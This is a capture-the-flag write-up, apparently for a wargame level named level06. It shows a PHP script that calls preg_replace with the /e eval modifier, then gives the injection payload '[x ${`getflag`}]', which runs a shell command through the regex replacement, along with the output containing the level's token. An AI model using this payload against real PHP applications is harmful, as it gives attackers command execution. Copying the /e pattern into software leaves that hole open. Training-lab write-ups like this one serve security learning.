## level06

home dir has 2 files, an exec and a php file.
I use https://beautifytools.com/php-beautifier.php to beautify the php file because it is unreadable

	#!/usr/bin/php
	<?php
	function y($m)
	{
		$m = preg_replace("/\./", " x ", $m);
		$m = preg_replace("/@/", " y", $m);
		return $m;
	}
	function x($y, $z)
	{
		$a = file_get_contents($y);
		$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
		$a = preg_replace("/\[/", "(", $a);
		$a = preg_replace("/\]/", ")", $a);
		return $a;
	}
	$r = x($argv[1], $argv[2]);
	print $r;
	?>

some search about preg_replace in php showed there are many vulnerabilities in php built in handling of regex. http://www.madirish.net/402, 

/e is meant for execution and the code inside is replaced by the second string where y is the variable given to the function. I replace the function in $y with a call to getflag.

	echo '[x ${`getflag`}]' > /tmp/getflag
	./level06 /tmp/getflag

outputs:
> PHP Notice:  Undefined variable: Check flag.Here is your token : `wiok45aaoguiboiki2tuin6ub`
 in /home/user/level06/level06.php(4) : regexp code on line 1
